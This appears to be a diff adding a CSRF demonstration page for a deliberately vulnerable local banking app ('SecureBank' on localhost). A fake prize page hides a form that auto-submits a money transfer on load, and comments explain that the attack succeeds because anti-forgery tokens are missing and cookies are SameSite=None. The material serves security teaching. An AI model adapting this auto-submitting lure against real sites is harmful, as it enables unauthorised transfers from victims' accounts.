@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>You've Won a Prize! 🎉</title>
+    <style>
+        body { font-family: Arial, sans-serif; max-width: 600px; margin: 100px auto; text-align: center; }
+        .prize { font-size: 48px; margin: 20px 0; }
+    </style>
+</head>
+<body>
+    <div class="prize">🎉🏆🎉</div>
+    <h1>Congratulations!</h1>
+    <p>You've been selected as a winner! Redirecting to claim your prize...</p>
+    <p><small style="color:#999">(CSRF Demo: While you read this, a money transfer was submitted to the bank...)</small></p>
+
+    <!--
+        CSRF ATTACK PAGE
+        This page is served from a DIFFERENT origin (attacker's domain).
+        When a victim who is logged into the banking app visits this page,
+        the hidden form auto-submits and transfers money WITHOUT the victim's knowledge.
+
+        This works because:
+        1. The victim's session cookie is automatically sent with the cross-origin POST request
+        2. The banking app's Transfer/Send endpoint has NO [ValidateAntiForgeryToken]
+        3. SameSite=None cookie policy allows cross-site requests
+
+        TO TEST:
+        1. Login to SecureBank at http://localhost:5000
+        2. Open this page in the SAME browser tab/window
+        3. Observe the unauthorized transfer in Transfer History
+    -->
+
+    <!-- CSRF Attack Form - auto-submits on page load -->
+    <form id="csrfAttack" action="http://localhost:5000/Transfer/Send" method="POST" target="hidden_frame" style="display:none;">
+        <input type="hidden" name="FromAccountNumber" value="USER001"/>
+        <input type="hidden" name="ToAccountNumber" value="ADMIN001"/>
+        <input type="hidden" name="Amount" value="100"/>
+        <input type="hidden" name="Description" value="Prize claim processing fee"/>
+    </form>
+
+    <!-- Hidden frame to suppress redirect -->
+    <iframe name="hidden_frame" style="display:none;"></iframe>
+
+    <script>
+        // Simulate progress bar while attack runs
+        document.forms['csrfAttack'].submit();
+
+        setTimeout(() => {
+            document.body.innerHTML += '<p style="color:red;font-size:1.2em">✅ CSRF Attack Executed!<br><small>Check Transfer History in the bank app.</small></p>';
+        }, 1000);
+    </script>
+</body>
+</html>
